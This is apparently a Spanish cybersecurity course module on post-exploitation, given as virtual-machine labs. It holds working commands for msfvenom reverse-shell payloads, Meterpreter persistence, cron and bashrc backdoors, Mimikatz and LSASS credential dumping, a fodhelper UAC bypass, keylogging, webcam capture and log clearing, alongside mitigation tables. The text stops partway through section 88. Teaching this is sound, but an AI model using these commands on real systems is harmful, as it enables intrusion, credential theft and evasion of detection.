| **Inicio**         | **atrás 8**                                                     | **Siguiente 10**                                           |
| ------------------ | --------------------------------------------------------------- | ---------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./2_8_Explotacion_y_hacking_de_vulnerabilidades_en_red.md) | [⏩](./2_10_Machine_Learning_aplicado_a_Ciberseguridad.md) |

---

## **Índice**

| Temario                                                                                                         |
| --------------------------------------------------------------------------------------------------------------- |
| [83. Introducción a la fase de Post-Explotación](#83-introducción-a-la-fase-de-post-explotación)                |
| [84. Técnicas de Post-Explotación](#84-técnicas-de-post-explotación)                                            |
| [85. Linux: Meterpreter para post-explotación](#85-linux-meterpreter-para-post-explotación)                     |
| [86. Windows: Meterpreter para post-explotación](#86-windows-meterpreter-para-post-explotación)                 |
| [87. Elevación de privilegios: UAC Bypass](#87-elevación-de-privilegios-uac-bypass)                             |
| [88. Volcado de memoria con Mimikatz](#88-volcado-de-memoria-con-mimikatz)                                      |
| [89. Procdump y lsass.exe](#89-procdump-y-lsassexe)                                                             |
| [90. Cracking de contraseñas: John the ripper y Hashcat](#90-cracking-de-contraseñas-john-the-ripper-y-hashcat) |
| [91. Backdoors en binarios](#91-backdoors-en-binarios)                                                          |
| [92. Migración de meterpreter a otro proceso](#92-migración-de-meterpreter-a-otro-proceso)                      |
| [93. Borrado de evidencias](#93-borrado-de-evidencias)                                                          |
| [94. Archivos relevantes para eliminar](#94-archivos-relevantes-para-eliminar)                                  |

---

# **Tecnicas de Post-Explotacion**

## **83. Introducción a la fase de Post-Explotación**

### 🎯 ¿QUÉ ES LA FASE DE POST-EXPLOTACIÓN?

Una vez que un atacante o pentester ha **explotado una vulnerabilidad y ha conseguido acceso al sistema**, **no ha terminado**. De hecho, ahí comienza una de las fases más críticas: **la post-explotación**.

### 🔍 Objetivo de la post-explotación:

> Obtener la **máxima información**, **mantener el acceso**, **moverse dentro de la red** y **extraer datos valiosos**.

---

### 🔄 Fases de un ataque típico

```
1. Reconocimiento → 2. Escaneo → 3. Explotación → ✅ 4. POST-EXPLOTACIÓN → 5. Exfiltración / Limpieza
```

---

### 🧠 ¿QUÉ INCLUYE LA POST-EXPLOTACIÓN?

| Técnica                    | Explicación                                   |
| -------------------------- | --------------------------------------------- |
| 🧑‍💻 Enumeración interna     | Buscar usuarios, contraseñas, configuraciones |
| 📌 Persistencia            | Dejar puertas traseras para volver a entrar   |
| 🔒 Escalada de privilegios | Subir de usuario común a administrador/root   |
| 🔐 Dump de credenciales    | Extraer contraseñas (hashes o texto plano)    |
| 🧭 Movimiento lateral      | Conectarse a otras máquinas desde ahí         |
| 🧼 Limpieza de huellas     | Borrar logs, evitar detección                 |

---

### 🧪 DEMOSTRACIÓN EN LABORATORIO (Máquinas virtuales)

#### 🖥️ Requisitos

| Máquina    | SO               | Rol      |
| ---------- | ---------------- | -------- |
| Kali Linux | Kali Rolling     | Atacante |
| Windows 10 | Win10 sin parche | Víctima  |

**Configuración**: Red interna o adaptador puente en VirtualBox / VMware.

---

#### 🛠️ INSTALACIÓN DE HERRAMIENTAS EN KALI

Abre terminal en Kali y ejecuta:

```bash
sudo apt update
sudo apt install metasploit-framework python3-impacket net-tools
```

Inicia Metasploit:

```bash
msfconsole
```

---

##### 💥 1. EXPLOTACIÓN INICIAL (CONSEGUIR ACCESO)

Simulamos que ya conseguimos acceso remoto con Meterpreter.

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <tu_IP_Kali>
set LPORT 4444
run
```

Y ahora en la víctima (Win10) ejecutamos un payload para conectarse:

```powershell
# Simulación: Victima hace doble clic en un ejecutable malicioso
```

---

### ✅ POST-EXPLOTACIÓN: PASO A PASO

#### 1️⃣ Enumeración del sistema

```bash
sysinfo          # Muestra info del sistema
getuid           # Usuario actual
ipconfig         # IPs de la máquina víctima
```

#### 2️⃣ Ver procesos activos

```bash
ps               # Lista procesos en ejecución
```

💡 Puedes usar `migrate <pid>` para moverte a otro proceso y mantener acceso más estable.

---

#### 3️⃣ Obtener usuarios y contraseñas

##### Dump de SAM (contraseñas locales de Windows)

```bash
hashdump         # Solo si tienes privilegios altos
```

##### Volcado de credenciales con Kiwi (Mimikatz)

```bash
load kiwi
creds_all
```

⚠️ Esto puede revelar contraseñas en texto plano si hay sesiones activas.

---

#### 4️⃣ Escalada de privilegios (si eres usuario común)

Ejecuta:

```bash
getsystem
```

Si falla, puedes buscar exploits locales con:

```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION <id_de_la_sesion>
run
```

---

#### 5️⃣ Persistencia: volver a entrar

Crea un backdoor para que se conecte cada vez que inicie sesión:

```bash
run persistence -X -i 5 -p 4444 -r <tu_IP_Kali>
```

Esto instala un payload que se ejecuta cada vez que Windows inicia sesión.

---

#### 6️⃣ Movimiento lateral

Si estás en una red con otras máquinas:

```bash
arp               # Muestra IPs vecinas
run post/windows/gather/enum_shares
run post/windows/gather/enum_domain
```

Puedes usar las credenciales para conectarte a otras máquinas por SMB o RDP.

---

#### 7️⃣ Limpieza de rastros

Para borrar logs de eventos o comandos usados:

```bash
clearev
```

Y eliminar backdoors creados:

```bash
run killav
```

---

### 🧠 EJEMPLO FÁCIL DE ENTENDER

#### 🎯 Objetivo:

Robar las contraseñas de un usuario de Windows 10 y moverte a otra PC de la red.

1. Usas un payload para acceder por Meterpreter.
2. Ejecutas `hashdump` y copias los hashes.
3. Usas `pth-winexe` desde Kali para conectarte a otra máquina con esos hashes.
4. Ya estás dentro sin conocer la contraseña real.

---

### 🧰 HERRAMIENTAS USADAS

| Herramienta     | Función                        |
| --------------- | ------------------------------ |
| Metasploit      | Explotación y post-explotación |
| Mimikatz / Kiwi | Obtener credenciales           |
| `hashdump`      | Volcado de contraseñas locales |
| `getsystem`     | Escalada de privilegios        |
| `persistence`   | Mantener acceso                |
| `clearev`       | Borrar logs                    |

---

### 📚 CONCLUSIÓN

| Tema              | Resumen                                                    |
| ----------------- | ---------------------------------------------------------- |
| ¿Qué es?          | La fase donde se aprovecha el acceso conseguido            |
| ¿Qué se hace?     | Obtener info, escalar privilegios, moverse, persistir      |
| ¿Qué se necesita? | Acceso previo + herramientas como Meterpreter o Powershell |
| ¿Cómo practicar?  | Laboratorio con Kali + Windows 10                          |
| ¿Cómo protegerse? | Monitorización, EDR, mínimos privilegios, parches          |

---

[🔼](#índice)

---

## **84. Técnicas de Post-Explotación**

### 🎯 ¿QUÉ SON LAS TÉCNICAS DE POST-EXPLOTACIÓN?

La **post-explotación** es la etapa después de haber **ganado acceso inicial a un sistema**. Ya no estás intentando entrar: **ya estás dentro**. Ahora debes:

> ⚙️ **Aprovechar el acceso para obtener información sensible, mantenerte oculto, moverte por la red o escalar privilegios.**

---

#### 🧱 OBJETIVOS PRINCIPALES DE LA POST-EXPLOTACIÓN

| Técnica                    | Objetivo                                             |
| -------------------------- | ---------------------------------------------------- |
| 🎯 Enumeración interna     | Saber dónde estás, quién eres, qué hay en la máquina |
| 🔐 Escalada de privilegios | Convertirte en administrador/root                    |
| 🧍‍♂️ Dump de credenciales    | Obtener contraseñas de usuarios                      |
| 🔁 Persistencia            | Mantener el acceso, incluso después de reinicios     |
| 🧭 Movimiento lateral      | Ir de una máquina a otra dentro de la red            |
| 🧼 Limpieza de huellas     | Borrar tus rastros para evitar ser detectado         |

---

### 🧪 LABORATORIO PRÁCTICO EN MÁQUINAS VIRTUALES

#### 🔧 ENTORNO NECESARIO

| Máquina    | SO           | Rol      |
| ---------- | ------------ | -------- |
| Kali Linux | Kali Rolling | Atacante |
| Windows 10 | Sin parches  | Víctima  |

Configuración: Red interna en VirtualBox o VMware.

---

#### 🛠️ INSTALACIÓN DE HERRAMIENTAS EN KALI

Abre la terminal de Kali:

```bash
sudo apt update
sudo apt install metasploit-framework python3-impacket net-tools
```

Lanza Metasploit:

```bash
msfconsole
```

---

### ⚡️ FASE 0: ACCESO INICIAL (simulado)

Creamos un **payload de acceso remoto (Meterpreter)**:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.2 LPORT=4444 -f exe -o shell.exe
```

Inicia el handler:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.2
set LPORT 4444
run
```

Simula que el usuario hace clic en `shell.exe` en la máquina Windows.

---

### 🧠 TÉCNICAS DE POST-EXPLOTACIÓN (CASO REAL)

---

#### 1️⃣ Enumeración del sistema

Una vez en Meterpreter:

```bash
sysinfo         # Info del sistema
getuid          # Usuario actual
ipconfig        # IP de la víctima
netstat -ano    # Conexiones activas
```

##### ¿Por qué importa?

Para saber dónde estás y qué tipo de sistema has comprometido.

---

#### 2️⃣ Dump de contraseñas

##### A. Volcado de SAM

```bash
hashdump
```

Obtendrás hashes como:

```
Administrator:500:aad3...:31d6...
```

Puedes usar estos hashes con `john` para intentar obtener las contraseñas reales.

---

##### B. Obtener credenciales en texto plano con Mimikatz (Kiwi)

```bash
load kiwi
creds_all
```

Esto puede mostrar contraseñas reales si hay sesiones activas.

---

#### 3️⃣ Escalada de privilegios

##### Método 1: Automático

```bash
getsystem
```

##### Método 2: Local Exploit Suggestion

```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

Esto te da una lista de exploits recomendados según el sistema.

---

#### 4️⃣ Persistencia

##### Crea un acceso que se active al iniciar Windows:

```bash
run persistence -U -i 5 -p 4444 -r 192.168.100.2
```

Opciones:

- `-U`: Usuario actual
- `-i`: Intervalo de reconexión
- `-p`: Puerto
- `-r`: IP del atacante

Esto crea una entrada en el registro para que el sistema vuelva a conectarse al atacante en cada reinicio.

---

#### 5️⃣ Movimiento lateral

##### Paso 1: Ver otras máquinas de la red

```bash
run post/windows/gather/arp_scanner RHOSTS=192.168.100.0/24
```

##### Paso 2: Conectarte a otra máquina usando SMB (Pass-the-Hash)

Usa los hashes obtenidos con Impacket:

```bash
impacket-psexec administrator@192.168.100.5 -hashes <LM>:<NT>
```

---

#### 6️⃣ Limpieza de huellas

```bash
clearev
```

Esto borra logs de eventos de Windows (útil para ocultar actividad).

---

### 🧰 HERRAMIENTAS COMUNES EN POST-EXPLOTACIÓN

| Herramienta     | Función                                    |
| --------------- | ------------------------------------------ |
| Meterpreter     | Acceso remoto y post-explotación           |
| Mimikatz / Kiwi | Volcado de contraseñas                     |
| Impacket        | Movimiento lateral, ejecución remota       |
| Enum4linux      | Enumeración de recursos compartidos en red |
| Netcat          | Accesos reversos simples                   |
| PowerShell      | Control total de sistemas Windows          |

---

### 🧪 EJEMPLO PRÁCTICO COMPLETO (RESUMEN)

1. El atacante crea `shell.exe` en Kali.
2. La víctima lo ejecuta en Win10.
3. Kali recibe conexión y lanza Meterpreter.
4. Se ejecuta `hashdump`, se extraen contraseñas.
5. Se ejecuta `getsystem` para escalar privilegios.
6. Se instala `persistence` para volver luego.
7. Se mueve lateralmente a otra máquina usando Impacket.
8. Se ejecuta `clearev` para borrar evidencias.

---

### 🔒 ¿CÓMO PROTEGERSE?

| Riesgo                   | Mitigación                                             |
| ------------------------ | ------------------------------------------------------ |
| Persistencia en registro | Usar herramientas como Autoruns, EDR                   |
| Movimiento lateral (SMB) | Aplicar segmentación de red, cambiar contraseñas       |
| Hashdump o Mimikatz      | Aplicar LSA Protection, no almacenar hashes en memoria |
| Elevación de privilegios | Mantener Windows actualizado                           |

---

### ✅ CONCLUSIÓN

Las técnicas de post-explotación son el **corazón de un pentest profesional**. No solo es importante entrar, sino **qué haces después**. Esta etapa revela el **impacto real de una brecha**.

---

[🔼](#índice)

---

## **85. Linux: Meterpreter para post-explotación**

### 🔍 ¿Qué es Meterpreter?

**Meterpreter** es un **payload avanzado** que se ejecuta en la máquina víctima **después de una explotación exitosa**. Permite al atacante:

- Controlar el sistema a distancia.
- Extraer información.
- Crear persistencia.
- Escalar privilegios.
- Moverse por la red.

> ⚠️ No es un exploit, es lo que ejecutas **después de explotar** para controlar el sistema.

---

### 🧠 ¿Y en Linux?

En Linux, Meterpreter funciona de forma muy similar a Windows, aunque con **algunas limitaciones** porque muchas funciones están diseñadas para Windows. Sin embargo, aún puedes:

| Función                 | ¿Disponible en Linux? |
| ----------------------- | --------------------- |
| Control remoto          | ✅ Sí                 |
| Captura de archivos     | ✅ Sí                 |
| Crear persistencia      | ✅ (manualmente)      |
| Escalada de privilegios | ✅ Sí                 |
| Mimikatz                | ❌ Solo en Windows    |

---

### 🧪 LABORATORIO EN MÁQUINAS VIRTUALES

#### 🔧 Requisitos:

| Máquina       | Sistema Operativo | Rol      |
| ------------- | ----------------- | -------- |
| Kali Linux    | Kali Rolling      | Atacante |
| Ubuntu Server | Ubuntu 22.04      | Víctima  |

Red: adaptador **red interna** (VirtualBox) o **host-only** (VMware).

---

#### 🛠️ Paso 1: Preparar Kali con Metasploit

Kali ya tiene Metasploit preinstalado. Si no lo tienes:

```bash
sudo apt update
sudo apt install metasploit-framework
```

Inicia Metasploit:

```bash
msfconsole
```

---

#### 🛠️ Paso 2: Crear Payload para Linux

Usamos `msfvenom` para crear un archivo ELF (ejecutable de Linux):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.2 LPORT=4444 -f elf > shell.elf
```

Explicación:

- `-p linux/x64/meterpreter/reverse_tcp`: payload de Meterpreter para Linux.
- `LHOST`: IP de Kali.
- `LPORT`: puerto para la conexión inversa.
- `-f elf`: formato ejecutable Linux.

🔁 Transfiere `shell.elf` a la víctima:

- Con `python -m http.server` o `scp`.

---

#### 🛠️ Paso 3: Preparar el Handler en Metasploit

En Kali:

```bash
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.2
set LPORT 4444
run
```

---

#### 🖱️ Paso 4: Ejecutar el Payload en la Víctima

En la máquina Ubuntu:

```bash
chmod +x shell.elf
./shell.elf
```

✅ En Kali deberías recibir una sesión `meterpreter`.

---

### 🧰 POST-EXPLOTACIÓN EN LINUX CON METERPRETER

Una vez dentro, puedes usar muchos comandos útiles:

---

#### 1️⃣ Información del sistema

```bash
sysinfo        # Información básica
getuid         # Usuario actual
```

---

#### 2️⃣ Listar procesos

```bash
ps
```

Puedes moverte a otro proceso con `migrate`, pero en Linux a veces esta función no está disponible.

---

#### 3️⃣ Navegar por archivos

```bash
pwd
ls
cd /etc
cat passwd
```

---

#### 4️⃣ Subir / descargar archivos

```bash
upload archivo.txt /tmp
download /etc/passwd
```

---

#### 5️⃣ Capturar comandos del usuario

Si tienes permisos, puedes usar:

```bash
keyscan_start
keyscan_dump
```

⚠️ Esta función es limitada en Linux.

---

#### 6️⃣ Escalada de privilegios

##### Usando `post/linux/local/exploit_suggester`

1. Vuelve a la consola de Metasploit:

```bash
background
use post/linux/gather/enum_linux
set SESSION <ID>
run
```

Esto enumera la configuración del sistema.

##### Exploit local sugerido:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION <ID>
run
```

Te dirá si puedes escalar a root.

---

#### 7️⃣ Crear persistencia manual

Puedes programar que se ejecute el payload cada vez que se inicie sesión:

##### A. Agrega al `~/.bashrc` del usuario víctima:

```bash
echo "~/shell.elf &" >> ~/.bashrc
```

##### B. Crear cronjob

```bash
(crontab -l ; echo "@reboot /home/user/shell.elf") | crontab -
```

---

#### 8️⃣ Limpiar huellas

```bash
rm ~/shell.elf
history -c
```

⚠️ También puedes borrar logs del sistema: `/var/log/auth.log`, pero cuidado con romper el sistema.

---

### 🧪 EJEMPLO COMPLETO (Resumen paso a paso)

1. Kali crea payload `shell.elf` con `msfvenom`.
2. Lo sube a la víctima Ubuntu (por web o scp).
3. Prepara Metasploit con el handler.
4. Víctima ejecuta `./shell.elf`.
5. Se abre una sesión Meterpreter en Kali.
6. El atacante explora, escala privilegios y crea persistencia.

---

### 🔒 ¿CÓMO PREVENIR ESTO?

| Riesgo                     | Solución                                      |
| -------------------------- | --------------------------------------------- |
| Payloads maliciosos        | Antivirus, AppArmor/SELinux, permisos mínimos |
| Escalada de privilegios    | Kernel actualizado, no usar root por defecto  |
| Persistencia por cron/bash | Monitor de integridad (AIDE, auditd)          |
| Conexiones inversas        | Firewall que bloquea conexiones salientes     |

---

### ✅ CONCLUSIÓN

Meterpreter en Linux **es una herramienta poderosa**, aunque con menos funciones que en Windows. Aun así, permite realizar:

- Recolección de datos.
- Movimiento lateral.
- Persistencia.
- Control total si se escala a root.

> 🔐 **Ideal para aprender ciberseguridad ofensiva en entornos de laboratorio controlados.**

---

[🔼](#índice)

---

## **86. Windows: Meterpreter para post-explotación**

### 🔍 ¿Qué es Meterpreter?

**Meterpreter** es un **payload (código malicioso)** que se ejecuta en la máquina víctima **después de haber sido explotada**. Proporciona una **consola remota en memoria**, con capacidades avanzadas para el atacante, sin escribir archivos en disco (para evitar detección).

#### 🔧 Características principales:

- Control total del sistema.
- Captura de contraseñas.
- Persistencia.
- Movimiento lateral.
- Registro de teclas (keylogging).
- Cámara, micrófono, captura de pantalla, etc.

---

### 🧠 ¿Qué es la **post-explotación**?

Una vez tienes acceso (por ejemplo, con Meterpreter), la **post-explotación** te permite:

| Acción                  | Descripción                                               |
| ----------------------- | --------------------------------------------------------- |
| Enumeración             | Saber qué usuarios, red, permisos, etc., tiene la víctima |
| Escalada de privilegios | Pasar de usuario a administrador (SYSTEM)                 |
| Robo de credenciales    | Obtener contraseñas, hashes o sesiones activas            |
| Persistencia            | Asegurar que mantienes acceso después de reinicios        |
| Limpieza de huellas     | Borrar logs y evidencias                                  |

---

### 🧪 LABORATORIO EN MÁQUINAS VIRTUALES

#### 🔧 Requisitos:

| Máquina             | Sistema Operativo     | Rol      |
| ------------------- | --------------------- | -------- |
| Kali Linux          | Kali Rolling          | Atacante |
| Windows 10 (sin AV) | Windows 10 Pro o Home | Víctima  |

💡 Puedes usar VirtualBox o VMware. Conecta ambas en **red interna** o **host-only**.

---

### ⚙️ Paso 1: Crear Payload para Windows con `msfvenom`

En **Kali Linux**, abre terminal:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.2 LPORT=4444 -f exe -o shell.exe
```

#### 📘 Explicación:

- `-p`: Payload, en este caso Meterpreter para Windows.
- `LHOST`: IP de Kali.
- `LPORT`: Puerto para recibir conexión.
- `-f exe`: Formato ejecutable de Windows.
- `-o shell.exe`: Archivo de salida.

---

### 🌐 Paso 2: Enviar `shell.exe` a la víctima (Windows 10)

Puedes hacerlo con un servidor web en Kali:

```bash
python3 -m http.server 8080
```

Luego, en Windows, abre navegador y accede a:

```
http://192.168.100.2:8080/shell.exe
```

⚠️ **Desactiva Windows Defender** para pruebas educativas.

> Configuración → Seguridad → Protección contra virus → Desactivar tiempo real.

---

### 📡 Paso 3: Preparar Handler en Kali (Metasploit)

Abre `msfconsole`:

```bash
sudo msfconsole
```

Y ejecuta:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.2
set LPORT 4444
run
```

---

### 🖱️ Paso 4: Ejecutar el Payload en Windows

En la VM víctima:

1. Abre `cmd`.
2. Navega hasta donde esté `shell.exe`.
3. Ejecuta:

```cmd
shell.exe
```

✅ En Kali deberías recibir una **sesión Meterpreter activa**.

---

### 🧰 Post-Explotación con Meterpreter en Windows

Una vez tengas la sesión:

---

#### 1️⃣ Información del sistema

```bash
sysinfo
getuid
ipconfig
```

Ejemplo:

```
Computer: WIN10-TEST
OS: Windows 10 (Build 19045)
User: User-PC\User
```

---

#### 2️⃣ Ver procesos y migrar

```bash
ps
migrate <pid>
```

> Migrar a un proceso como `explorer.exe` para evitar que se cierre tu sesión si el usuario cierra el `shell.exe`.

---

#### 3️⃣ Robo de contraseñas con Mimikatz

Cargar el módulo Kiwi:

```bash
load kiwi
creds_all         # Listar todas las credenciales activas
```

También puedes usar:

```bash
hashdump          # Ver hashes de SAM (usuarios locales)
```

---

#### 4️⃣ Persistencia (Acceso tras reinicio)

```bash
run persistence -U -i 5 -p 4444 -r 192.168.100.2
```

- `-U`: Usuario actual.
- `-i 5`: Intentar reconectar cada 5 segundos.
- `-p`: Puerto.
- `-r`: IP atacante.

Se guarda un acceso en el Registro de Windows (auto start).

---

#### 5️⃣ Captura de pantalla, webcam y audio

```bash
screenshot            # Toma una captura de pantalla
record_mic -d 10      # Graba audio por 10 segundos
webcam_snap 1         # Toma una foto de la webcam
```

---

#### 6️⃣ Keylogger (Registro de teclas)

```bash
keyscan_start
keyscan_dump
```

Captura lo que el usuario escriba en su teclado.

---

#### 7️⃣ Movimiento lateral (con credenciales)

Si tienes las credenciales de un admin de red, puedes usar:

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.100.3
set SMBUser administrador
set SMBPass laContraseña123
set payload windows/meterpreter/reverse_tcp
run
```

---

#### 8️⃣ Limpieza de huellas

```bash
clearev
```

Limpia logs del visor de eventos.

---

### 🛡️ ¿Cómo proteger un Windows real?

| Riesgo                   | Contramedida                                             |
| ------------------------ | -------------------------------------------------------- |
| Payload ejecutado        | Antivirus, UAC, no ejecutar archivos desconocidos        |
| Mimikatz / hashdump      | Activar LSA Protection, usar Windows Hello               |
| Persistencia             | Monitorizar claves de registro con Sysinternals Autoruns |
| Movimiento lateral (SMB) | Desactivar SMBv1, aplicar parches                        |
| Keylogging y webcam      | Control de dispositivos y alertas                        |

---

### ✅ RESUMEN PASO A PASO

1. **Kali** crea `shell.exe` con `msfvenom`.
2. Se sube a **Windows 10 víctima**.
3. Se lanza el handler en **Metasploit**.
4. Víctima ejecuta el archivo y se abre **Meterpreter**.
5. Se extrae información, contraseñas, se gana persistencia.

---

[🔼](#índice)

---

## **87. Elevación de privilegios: UAC Bypass**

### 🔍 ¿Qué es la elevación de privilegios?

La **elevación de privilegios** permite a un atacante pasar de tener acceso como **usuario limitado** a tener acceso como **administrador (privilegios altos)**.

---

### 🔐 ¿Qué es UAC?

**UAC (User Account Control)** es una función de seguridad en Windows que:

- Notifica al usuario cuando un programa intenta hacer cambios al sistema.
- Previene que usuarios normales ejecuten código como administrador sin permiso explícito.

### 🧠 ¿Qué es un **UAC Bypass**?

Es una técnica para **saltarse esa protección sin mostrar el aviso de UAC**, y ejecutar código con privilegios de administrador **sin que el usuario lo autorice**.

---

#### ⚠️ Escenario típico

> Tienes una **sesión de Meterpreter** como usuario normal en Windows 10.
>
> Quieres convertirte en **administrador** para acceder a todo el sistema.
>
> Solución: Usas una técnica de **UAC Bypass** para escalar tus privilegios.

---

### 🧪 LABORATORIO EN MÁQUINAS VIRTUALES

### Requisitos:

| Máquina          | Sistema Operativo | Rol      |
| ---------------- | ----------------- | -------- |
| Kali Linux       | Kali Rolling      | Atacante |
| Windows 10 (Pro) | Windows 10 (x64)  | Víctima  |

- Conectadas por **red interna o host-only**.
- Antivirus **desactivado** para pruebas.
- Usuario víctima debe ser **miembro del grupo Administradores**, pero **no ejecutar con privilegios elevados por defecto**.

---

#### 🛠️ Paso 1: Obtener sesión básica en Windows (sin admin)

Desde Kali, crea un payload con Meterpreter:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.2 LPORT=4444 -f exe -o payload.exe
```

Sirve el archivo:

```bash
python3 -m http.server 80
```

Desde Windows, descarga y ejecuta `payload.exe`.
En Kali, configura el **handler**:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.2
set LPORT 4444
run
```

✅ Ya tienes una sesión `meterpreter`.

---

#### 🧪 Paso 2: Verifica si puedes escalar

Dentro de Meterpreter:

```bash
getuid
```

Si ves algo como:

```
Server username: VICTIMA-PC\Usuario
```

Y **no** tienes SYSTEM ni Administrador, puedes intentar UAC Bypass.

Comprueba que el usuario actual esté en el grupo administradores:

```bash
shell
net localgroup administrators
```

---

### 🧠 ¿Cómo funciona el UAC Bypass?

Existen muchas técnicas. Las más comunes explotan aplicaciones legítimas del sistema como `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe`, etc., que:

- **Ejecutan con privilegios elevados**.
- **Cargan claves del registro editables por usuarios normales**.
- Puedes modificar ese comportamiento para ejecutar tu propio código.

---

#### 🛠️ Paso 3: Usar módulo UAC Bypass de Metasploit

En Kali:

1. En Meterpreter, ejecuta:

```bash
background
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.2
set LPORT 5555
run
```

Este exploit:

- Usa `fodhelper.exe`.
- Modifica una clave de registro.
- Lanza un nuevo payload como administrador.

En otra pestaña, prepárate para recibir la nueva sesión (puerto 5555):

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.2
set LPORT 5555
run
```

Cuando se abra la sesión:

```bash
getuid
```

Debes ver algo como:

```
Server username: NT AUTHORITY\SYSTEM
```

✅ ¡Has escalado privilegios con éxito!

---

#### 🧪 Paso 4: Alternativa manual usando fodhelper.exe

Desde tu primera sesión de Meterpreter (como usuario), abre una shell:

```bash
shell
```

Luego, ejecuta estos comandos para modificar el registro:

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
```

Y ejecuta:

```cmd
fodhelper.exe
```

⚠️ Se abrirá una terminal con privilegios de administrador.

Desde ahí puedes ejecutar comandos, subir otro payload, o agregar usuarios al sistema.

---

### 🔐 ¿Cómo protegerse contra UAC Bypass?

| Riesgo                       | Mitigación                                           |
| ---------------------------- | ---------------------------------------------------- |
| Claves de registro editables | Monitor con herramientas como Sysmon                 |
| Aplicaciones auto-elevadas   | Restringir ejecución de `fodhelper.exe`, `sdclt.exe` |
| UAC muy bajo o desactivado   | Configurar UAC al nivel más alto                     |
| Usuario con derechos admin   | Crear cuentas de usuario estándar por defecto        |

---

### ✅ RESUMEN PASO A PASO

1. Obtener sesión básica con `meterpreter`.
2. Verificar que el usuario tenga privilegios pero sin elevación.
3. Usar módulo de UAC Bypass (`fodhelper`, `eventvwr`, etc.).
4. Se ejecuta nuevo payload como administrador (NT AUTHORITY\SYSTEM).
5. Control total del sistema.

---

### 📦 BONUS: Herramientas útiles

| Herramienta      | Uso                                    |
| ---------------- | -------------------------------------- |
| `winpeas.exe`    | Enumera rutas para escalar privilegios |
| `PowerUp.ps1`    | Búsqueda de vulnerabilidades locales   |
| `UACME` (github) | Colección de técnicas reales de bypass |

---

[🔼](#índice)

---

## **88. Volcado de memoria con Mimikatz**

### 🧠 **Volcado de Memoria con Mimikatz (en Windows)**

> Técnicas para extraer contraseñas, hashes y credenciales desde la memoria RAM de una máquina Windows comprometida.

---

### 📌 ¿Qué es Mimikatz?

**Mimikatz** es una herramienta de **post-explotación** que permite:

- Extraer **contraseñas en texto plano**.
- Extraer **hashes** de usuarios.
- Leer **tokens de autenticación Kerberos**.
- Realizar **ataques de "pass-the-hash", "pass-the-ticket"**, y más.

Funciona accediendo a estructuras de memoria de Windows donde se almacenan las credenciales **temporalmente**.

---

### 🧠 ¿Qué es un volcado de memoria?

Un **volcado de memoria (memory dump)** es una **copia de todo lo que hay en la RAM** de un sistema.
Contiene información muy valiosa como:

- Contraseñas abiertas en sesiones activas.
- Archivos abiertos o cachés.
- Tokens de acceso.

---

### 🎯 ¿Para qué sirve?

Si logras acceder a una máquina Windows (como usuario o admin), puedes:

1. Volcar el contenido de la memoria.
2. Analizarlo con Mimikatz.
3. **Extraer contraseñas en texto plano**, aunque no tengas privilegios de administrador completo.

---

### 🧪 LABORATORIO EN MÁQUINAS VIRTUALES

#### 🔧 Requisitos:

| Máquina        | Sistema Operativo | Rol      |
| -------------- | ----------------- | -------- |
| Kali Linux     | Kali Rolling      | Atacante |
| Windows 10 Pro | Windows 10 x64    | Víctima  |

Conéctalas por red interna o Host-Only.

Desactiva Windows Defender en la VM de Windows para permitir el uso de Mimikatz (solo con fines educativos).

---

#### 🧱 Instalación de Mimikatz en Windows

#### 🛠️ Opción 1: Manual (en VM Windows)

1. Descarga Mimikatz desde GitHub (versión oficial):
   [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)

2. Extrae el `.zip`.

3. Ejecuta `mimikatz.exe` **como administrador**.

---

### 💣 Paso a Paso: Volcado de Memoria + Extracción de Credenciales

#### ✅ 1. **Usando Mimikatz directamente**

##### 🔓 Ejecuta Mimikatz:

```cmd
mimikatz.exe
```

##### 📥 Cargar módulo de privilegios:

```mimikatz
privilege::debug
```

> Esto permite acceder a procesos protegidos.

##### 📦 Extraer credenciales de memoria (LSASS):

```mimikatz
sekurlsa::logonpasswords
```

📌 Esto muestra:

- Nombre de usuario
- Dominio
- Contraseña en texto plano (si está en memoria)
- Hash NTLM
- Tokens

---

#### ✅ 2. **Volcar memoria de LSASS a archivo y analizar después**

Si prefieres no interactuar directamente:

##### 📤 Crear volcado de memoria:

Desde CMD con permisos:

```cmd
tasklist | findstr lsass
```

Anota el **PID** del proceso LSASS.

```cmd
rundll32 comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

> Esto crea un archivo `lsass.dmp` en `C:\`.

##### 📥 Analizar el volcado con Mimikatz:

```mimikatz
sekurlsa::minidump C:\lsass.dmp
sekurlsa::logonpasswords
```

✅ Esto extrae los datos del volcado, **sin necesidad de acceso en vivo** a la memoria.

---

#### ✅ 3. **Desde Meterpreter (opcional)**

Si ya tienes una sesión `meterpreter`:

```bash
load kiwi
creds_all
```

> Muestra todas las credenciales activas, sin ejecutar Mimikatz directamente.

---

### 🧪 Ejemplo Real en VM

1. VM Windows: inicia sesión como un usuario (por ejemplo, `admin123` con clave `Contraseña123`).
2. Desde esa VM, ejecuta `mimikatz.exe`.
3. Ejecuta:

```mimikatz
privilege::debug
sekurlsa::logonpasswords
```

🔐 Verás:

```
Username: admin123
Password: Contraseña123
```

---

